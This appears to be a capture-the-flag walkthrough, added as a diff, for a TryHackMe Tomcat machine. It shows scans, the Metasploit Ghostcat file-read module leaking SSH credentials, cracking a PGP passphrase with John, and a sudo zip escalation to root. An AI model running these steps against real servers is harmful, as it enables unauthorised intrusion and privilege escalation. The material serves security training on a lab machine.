@@ -1,0 +1,160 @@
+//Tomghost//
+
+{{NMAP SCAN}}
+
+nmap -sV -T4 -p- [machine IP]
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-01 13:41 EST
+Warning: 10.10.18.15 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.18.15
+Host is up (0.12s latency).
+Not shown: 65337 closed ports, 194 filtered ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+53/tcp   open  tcpwrapped
+8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
+8080/tcp open  http       Apache Tomcat 9.0.30
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 932.13 seconds
+
+
+{{GOBUSTER RESULTS}}
+
+gobuster -u http://[machine IP]:8080 -w /path/to/wordlist.txt -x php,html,txt
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.18.15:8080/
+[+] Threads      : 10
+[+] Wordlist     : /home/techtyte/thm/dirbcommon.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Extensions   : html,txt,php
+[+] Timeout      : 10s
+=====================================================
+2022/02/01 14:44:13 Starting gobuster
+=====================================================
+/docs (Status: 302)
+/examples (Status: 302)
+/favicon.ico (Status: 200)
+/host-manager (Status: 302)
+/manager (Status: 302)
+=====================================================
+2022/02/01 14:48:33 Finished
+=====================================================
+
+
+The likely way in looks to be this exploit I found on exploit-db:
+CVE-2020-1938: Apache Tomcat - AJP 'Ghostcat' File Read/Inclusion (Metasploit) 
+https://www.exploit-db.com/exploits/49039
+
+Fire up metasploit:
+msfconsole
+use /auxiliary/admin/http/tomcat_ghostcat
+show options
+
+Module options (auxiliary/admin/http/tomcat_ghostcat):
+
+   Name      Current Setting   Required  Description
+   ----      ---------------   --------  -----------
+   AJP_PORT  8009              no        The Apache JServ Protocol (AJP) port
+   FILENAME  /WEB-INF/web.xml  yes       File name
+   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT     8080              yes       The Apache Tomcat webserver port (TCP)
+   SSL       false             yes       SSL
+
+set RHOSTS [machine IP]
+
+Leave the Filename as it is and run.
+
+[*] Running module against 10.10.18.15
+Status Code: 200
+Accept-Ranges: bytes
+ETag: W/"1261-1583902632000"
+Last-Modified: Wed, 11 Mar 2020 04:57:12 GMT
+Content-Type: application/xml
+Content-Length: 1261
+<?xml version="1.0" encoding="UTF-8"?>
+<!--
+ Licensed to the Apache Software Foundation (ASF) under one or more
+  contributor license agreements.  See the NOTICE file distributed with
+  this work for additional information regarding copyright ownership.
+  The ASF licenses this file to You under the Apache License, Version 2.0
+  (the "License"); you may not use this file except in compliance with
+  the License.  You may obtain a copy of the License at
+
+      http://www.apache.org/licenses/LICENSE-2.0
+
+  Unless required by applicable law or agreed to in writing, software
+  distributed under the License is distributed on an "AS IS" BASIS,
+  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+  See the License for the specific language governing permissions and
+  limitations under the License.
+-->
+<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
+  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
+                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
+  version="4.0"
+  metadata-complete="true">
+
+  <display-name>Welcome to Tomcat</display-name>
+  <description>
+     Welcome to GhostCat
+	skyfuck:[the real password is here]
+  </description>
+
+</web-app>
+
+We've successfully gotten some credentials. Let's plug it into ssh and log in.
+
+ssh skyfuck@[machine IP]
+
+user.txt is in /home/merlin/
+
+In skyfuck's home folder, we have two files:
+credential.pgp  tryhackme.asc
+
+One is a PGP (pretty good privacy) encrypted file and the other is a private key.
+
+If we try to decrypt it with the key, we still get prompted for a passphrase.
+
+Transfer the files over to your machine so we can crack it.
+
+scp skyfuck@10.10.208.117:tryhackme.asc /your/folder/
+
+Next, use gpg2john:
+
+gpg2john tryhackme.asc > thmhash
+
+And finally john to get the passphrase:
+
+john --wordlist=/path/to/rockyou.txt thmhash
+
+Once that is done, we can decrypt the file with:
+
+gpg --import tryhackme.asc 
+
+gpg --output ./decrypted_message.txt --decrypt ./credential.pgp
+Enter the passphrase at the prompt
+
+cat decrypted_message.txt
+
+Inside, we get credentials for user "merlin".
+
+su merlin
+enter the password
+
+sudo -l shows us:
+User merlin may run the following commands on ubuntu:
+    (root : root) NOPASSWD: /usr/bin/zip
+    
+We may use zip as sudo, and exploit this to obtain root.
+
+According to gtfobins, we can execute these commands to do so:
+TF=$(mktemp -u)
+sudo zip $TF /etc/hosts -T -TT 'sh #'
+
+Congrats! root.txt is in /root/
